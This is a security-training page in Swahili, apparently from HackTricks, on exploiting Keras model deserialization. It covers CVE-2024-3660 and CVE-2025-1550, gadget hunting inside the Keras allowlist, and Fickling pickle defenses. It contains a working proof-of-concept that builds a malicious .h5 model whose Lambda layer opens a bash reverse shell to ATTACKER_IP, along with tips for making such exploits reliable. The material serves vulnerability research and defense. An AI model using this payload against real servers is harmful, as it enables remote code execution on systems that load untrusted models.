# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa mbinu za vitendo za exploitation dhidi ya pipeline ya Keras model deserialization, unaeleza maelezo ya ndani ya format asilia ya .keras na attack surface, na unatoa toolkit ya watafiti ya kutafuta Model File Vulnerabilities (MFVs) na gadgets zinazoweza kutumiwa baada ya marekebisho.

## Maelezo ya ndani ya format ya model ya .keras

Faili ya .keras ni kumbukumbu ya ZIP iliyo na angalau:<sup>[[1]](#references)</sup>
- metadata.json – taarifa za jumla (kwa mfano, toleo la Keras)
- config.json – usanifu wa model (attack surface kuu)
- model.weights.h5 – weights katika HDF5

config.json huendesha deserialization ya kujirudia: Keras huingiza modules, hutatua classes/functions na kuunda upya layers/objects kutoka kwenye dictionaries zinazodhibitiwa na mshambuliaji.<sup>[[1]](#references)</sup>

Mfano wa kipande cha code cha object ya layer ya Dense:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Udeserialishaji hufanya:<sup>[[1]](#references)</sup>
- Huagiza module na kutafuta symbol kutoka kwa funguo za module/class_name
- Huita from_config(...) au constructor kwa kwargs zinazodhibitiwa na mshambuliaji
- Hujirudia kwenye objects zilizopachikwa (activations, initializers, constraints, n.k.)

Kihistoria, hili lilimpa mshambuliaji anayetengeneza config.json primitives tatu:<sup>[[1]](#references)</sup>
- Kudhibiti modules zitakazoagizwa
- Kudhibiti classes/functions zitakazopatikana
- Kudhibiti kwargs zinazopitishwa kwa constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Chanzo cha tatizo:
- Udeserialishaji wa zamani wa Lambda ulitengeneza upya function ya Python kutoka kwa code iliyomarshaliwa na kudhibitiwa na mshambuliaji: `func_load()` hufanya base64-decode ya payload, kuita `marshal.loads()`, na kuunda `FunctionType`. Bytecode ya function inayotokana nayo huendeshwa Lambda inapoitwa, na loaders zilizoathirika za kabla ya 2.13 hazikutekeleza ukaguzi wa safe-mode kwa formats za zamani.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Katika archive asilia ya Keras v3, function ya Lambda huwakilishwa kama object ya `__lambda__` ambayo sehemu yake ya `code` ina code iliyomarshaliwa na kusimbwa kwa base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Kupunguza hatari:
- Keras hutumia `safe_mode=True` kwa chaguo-msingi katika umbizo asilia la Keras v3. Lambda za Python zilizoserialishwa ndani ya `Lambda` huzuiwa isipokuwa mtumiaji azime ulinzi huo waziwazi kwa kutumia `safe_mode=False`; ulinzi huu hautumiki kwa miundo ya zamani kwa namna hiyo hiyo.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Maelezo:
- Miundo ya zamani (hifadhi za awali za HDF5) au codebase za zamani huenda zisitekeleze ukaguzi wa kisasa, kwa hivyo mashambulizi ya aina ya “downgrade” bado yanaweza kutumika wakati waathiriwa wanapotumia loaders za zamani.

## CVE-2025-1550 – Uingizaji wa moduli kiholela katika Keras 3.0.0–3.8.x

Chanzo kikuu:
- `_retrieve_class_or_fn` ilitumia `importlib.import_module(module)` kwenye majina ya moduli yaliyodhibitiwa na mshambuliaji kutoka `config.json`.
- Athari: Kumbukumbu ya `.keras` iliyoundwa mahsusi inaweza kusababisha `Model.load_model()` kuingiza moduli na functions za Python zilizochaguliwa na mshambuliaji, na kusababisha athari wakati wa kuingiza pamoja na kutumia hoja zinazodhibitiwa na mshambuliaji, hata wakati `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Wazo la exploit:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Maboresho ya usalama (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports zimewekewa kikomo kwa modules rasmi za ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True huzuia upakiaji usio salama wa serialized function za Lambda
- Ukaguzi wa msingi wa aina: objects zilizodeserialize lazima zilingane na aina zinazotarajiwa

## Unyonyaji wa vitendo: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Matumizi ya zamani ya TensorFlow-Keras huenda bado yakakubali faili za model za HDF5 (`.h5`). Ikiwa mshambuliaji anaweza kupakia model ambayo seva itapakia baadaye au kuitumia kufanya inference, loader iliyoathiriwa inaweza kudeserialize Lambda layer yenye Python inayodhibitiwa na mshambuliaji, ambayo inaweza kisha kutekelezwa katika workflow ya model ya programu.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC ndogo ya kutengeneza .h5 hasidi ambayo Lambda yake hutekeleza reverse shell wakati target inapoiendesha model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Vidokezo na ushauri wa kutegemewa:
- Sehemu za trigger hutofautiana kulingana na format na workflow; write-up iliyorejelewa iliona payload ikitekelezwa mara mbili wakati wa prediction. Chukulia side effects kuwa zinaweza kujirudia na ufanye payloads ziwe idempotent.<sup>[[7]](#references)</sup>
- Kufunga version: linganisha TF/Keras/Python ya mwathiriwa ili kuepuka kutolingana kwa serialization. Kwa mfano, tengeneza artifacts chini ya Python 3.8 yenye TensorFlow 2.13.1 ikiwa ndivyo target inavyotumia.<sup>[[7]](#references)</sup>
- Uigaji wa haraka wa mazingira:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Uthibitishaji: payload isiyo na madhara kama `os.system("ping -c 1 YOUR_IP")` husaidia kuthibitisha utekelezaji (kwa mfano, kuona ICMP kwa kutumia tcpdump) kabla ya kubadili hadi reverse shell.<sup>[[7]](#references)</sup>

## Eneo la gadget baada ya marekebisho ndani ya allowlist

Hata kwa allowlist ya moduli za Keras na safe mode, callable zinazoruhusiwa zinaweza kufichua athari za side effect. Kwa mfano, `keras.utils.get_file` hupakua URL na kuiandika chini ya eneo la cache lililowekwa, hivyo inaweza kuchunguzwa kama gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Usanidi wa Lambda unaoweza kuchunguzwa (thibitisha saini ya mwito katika jaribio linalodhibitiwa):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Kikomo muhimu:
- `Lambda.call()` daima hupitisha ingizo la modeli kama hoja ya kwanza ya nafasi na `arguments` zilizosanidiwa kama hoja za maneno muhimu. Kwa `get_file`, thamani hiyo ya nafasi hujaza `fname`; kutolingana kwa tensor/njia ya faili kunaweza kusababisha mgombea huyu kushindwa kabla ya upakuaji wowote, kwa hiyo si gadget inayohakikishiwa kufanya kazi.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Kuruhusu uingizaji wa ML pickle kwa modeli za AI/ML (Fickling)

Miundo mingi ya modeli za AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, vizalia vya joblib/scikit-learn, na miundo mingine asilia ya Python) hujumuisha data ya Python pickle. Njia ya zamani ya Keras Lambda iliyoelezwa hapo juu hutumia bytecode ya function iliyohifadhiwa kwa marshal badala yake, kwa hiyo ni hatari tofauti ya deserialization. Pickle opcodes zinaweza kutekeleza tabia inayodhibitiwa na mshambuliaji wakati wa deserialization, ikiwemo kubadilisha modeli au RCE, na scanners rahisi zinaweza kukosa imports hatari mpya au zisizoorodheshwa.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Ulinzi wa kiutendaji unaokataa kwa chaguomsingi ni kuweka hook kwenye deserializer ya pickle ya Python na kuruhusu tu seti iliyopitiwa ya imports zisizo na madhara zinazohusiana na ML wakati wa unpickling. Fickling ya Trail of Bits hutekeleza sera hii na hutoa allowlist ya imports za ML iliyochaguliwa kutoka kwa maelfu ya pickle za umma za Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Muundo wa usalama wa imports “salama” (uelewa wa jumla uliotokana na utafiti na utendaji): alama zilizoingizwa na pickle lazima zitimize masharti haya yote kwa pamoja:<sup>[[8]](#references)</sup>
- Zisifanye au kusababisha utekelezaji wa code (hakuna objects za code zilizokusanywa/msimbo wa chanzo, kuendesha shell, hooks, n.k.)
- Zisifanye get/set ya attributes au items kiholela
- Zisiimport au kupata marejeleo ya objects nyingine za Python kutoka kwa pickle VM
- Zisichochee deserializers nyingine zozote (k.m., marshal, pickle iliyopachikwa), hata kwa njia isiyo ya moja kwa moja

Washa ulinzi wa Fickling mapema iwezekanavyo wakati wa kuanzisha mchakato ili loads zozote za pickle zinazofanywa na frameworks (torch.load, joblib.load, n.k.) zikaguliwe:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Vidokezo vya uendeshaji:
- Unaweza kuzima/kuwasha tena hooks kwa muda inapohitajika:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Ikiwa model inayojulikana kuwa salama imezuiwa, panua allowlist ya mazingira yako baada ya kukagua alama:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling pia hutoa guards za jumla za runtime ikiwa unapendelea udhibiti wa kina zaidi:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() ili kutekeleza ukaguzi kwa pickle.load() zote
  - with fickling.check_safety(): kwa utekelezaji wenye scope maalum
  - fickling.load(path) / fickling.is_likely_safe(path) kwa ukaguzi wa mara moja

- Pendelea miundo ya model isiyotumia pickle inapowezekana (k.m., SafeTensors).<sup>[[15]](#references)</sup> Ikiwa lazima ukubali pickle, endesha loaders kwa ruhusa za chini kabisa, bila network egress, na utekeleze allowlist.

Mkakati huu unaotanguliza allowlist huzuia kwa dhahiri njia za kawaida za unyonyaji wa ML pickle huku ukidumisha uoanifu wa hali ya juu. Katika benchmark ya ToB, Fickling ilitambua 100% ya faili hasidi za majaribio na kuruhusu takriban 99% ya faili safi kutoka kwenye repos maarufu za Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Zana za mtafiti

1) Ugunduzi wa kimfumo wa gadgets katika modules zinazoruhusiwa

Orodhesha callables zinazoweza kuwa wagombea katika keras, keras_nlp, keras_cv, keras_hub na zipatie kipaumbele zile zenye athari za file/network/process/env.<sup>[[1]](#references)</sup>

<details>
<summary>Orodhesha callables zinazoweza kuwa hatari katika modules za Keras zilizo kwenye allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Upimaji wa moja kwa moja wa deserialization (hakuna archive ya .keras inayohitajika)

Wasilisha dicts zilizoundwa mahususi moja kwa moja kwa Keras deserializers ili kubaini params zinazokubaliwa na kuona side effects.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Uchunguzi wa matoleo mbalimbali na fomati

Keras ipo katika codebase na enzi tofauti zenye vizuizi tofauti:<sup>[[1]](#references)</sup>
- Keras iliyojengewa ndani ya TensorFlow: tensorflow/python/keras (ya zamani, imepangwa kufutwa)
- tf-keras: inadumishwa kando
- Keras 3 ya multi-backend (rasmi): ilianzisha .keras asilia

Rudia majaribio katika codebase na fomati tofauti (.keras dhidi ya HDF5 ya zamani) ili kugundua regressions au vizuizi vilivyokosekana.

## References

- [1] [Kutafuta Udhaifu katika Keras Model Deserialization (blogu ya huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Iliongeza ukaguzi kwenye serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE kupitia Keras Lambda deserialization](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Uingizaji wa module kiholela wa Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Ripoti ya huntr – uingizaji kiholela #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Ripoti ya huntr – uingizaji kiholela #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE ya TensorFlow .h5 Lambda hadi root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blogu ya Trail of Bits – Kichanganuzi kipya cha faili za AI/ML pickle cha Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Kulinda mazingira ya AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Mkusanyiko wa data za majaribio ya uchanganuzi wa pickle wa Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Utangulizi wa mashambulizi ya Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Mradi wa SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers huruhusu uingizaji wa code kiholela](https://kb.cert.org/vuls/id/253266)
- [17] [Chanzo cha Keras Lambda layer (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Chanzo cha Keras Python utilities (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API ya Keras `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
